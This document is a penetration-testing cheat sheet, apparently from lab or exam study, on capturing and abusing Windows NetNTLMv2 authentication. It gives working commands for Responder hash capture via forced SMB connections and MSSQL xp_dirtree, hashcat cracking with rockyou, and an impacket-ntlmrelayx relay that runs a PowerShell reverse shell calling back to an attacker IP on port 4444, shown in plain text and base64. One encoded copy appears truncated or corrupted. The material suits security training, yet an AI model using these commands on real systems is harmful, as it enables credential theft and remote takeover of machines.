## Responder
```
Capture forced authentication credentials.
sudo  responder -I tun0 -wv  

Snap the web_svc user's credentials forcing them to authenticate to our impacket-smbserver/Responder smb server. 
UNC Path from portal \\192.168.x.x\smbshare 
\\192.168.x.x\smbshare
C:\Windows\system32>dir \\192.168.x.x\smbshare

Crack the hash.
hashcat -m 5600 mute.hash /usr/share/wordlists/rockyou.txt 


Getting an NetNTLMv2 Hash from MS-SQL (port 1433)
After finding that we have access to mssql, we can use a great tool called mssqlclient.py from the Impacket Collection of Tools to connect to the server with the following command:
mssqlclient.py -p 1433 reporting@10.10.10.125 -windows-auth

We get prompted for the password and successfully gain an ‘SQL’ shell.
The first thing we want is enumerate the database and then try to enable the xp_cmdshell; however, if we are denied access to do so, we can try running Responder to grab a hash of the user who owns the MSSQL service.

Fire up Responder with the following command:
responder -I tun0

With Responder running, we can now dump the MSSQL service owners hash using the exec master..exp_dirtree command, like so:
exec master..xp_dirtree '\\10.10.14.2\test'

This will attempt to connect to a share named ‘test’ on our attacker machine’s IP. When the user attempts to connect, they will present the NetNTLMv2 hash of the service owner to request to connect to our share. Responder will intercept this request and dump the NetNTLMv2 hash.

Crack the NetNTLMv2
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force

NetNTLMv2 Relay
Relaying Net-NTLMv2

Imagine we obtained the Net-NTLMv2 hash, but couldn't crack it because it was too complex.

In this attack, we'll again use the dir command in the bind shell to create an SMB connection to our Kali machine. 
Instead of merely printing the Net-NTLMv2 hash used in the authentication step, we'll forward it to FILES02. 
If files02admin is a local user of FILES02, the authentication is valid and therefore accepted by the machine. 
If the relayed authentication is from a user with local administrator privileges, we can use it to authenticate and then execute commands over SMB with methods similar to those used by psexec or wmiexec.

If UAC remote restrictions are enabled on the target then we can only use the local Administrator user for the relay attack.

ntlmrelayx
We'll perform this attack with ntlmrelayx, another tool from the impacket library. 
This tool does the heavy lifting for us by setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target of our choice.

Let's get right into the attack by starting ntlmrelayx, which we can use with the pre-installed impacket-ntlmrelayx package. 
We'll use --no-http-server to disable the HTTP server since we are relaying an SMB connection and -smb2support to add support for SMB2. 
We'll also use -t to set the target to FILES02. 
Finally, we'll set our command with -c, which will be executed on the target system as the relayed user. 

We'll use a PowerShell reverse shell one-liner,  which we'll base64-encode and execute with the -enc argument 

kali@kali:~$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.x -c "powershell -enc JABjAGwAaQBlAG4AdA..." 

└─$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.156.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA1ADYAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

PS base64 encoded reverse shell one liner via PS
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.x",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA1ADYAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


Try intercepting archive POST request and modified archive= parameter to \\192.168.119.x\test
```



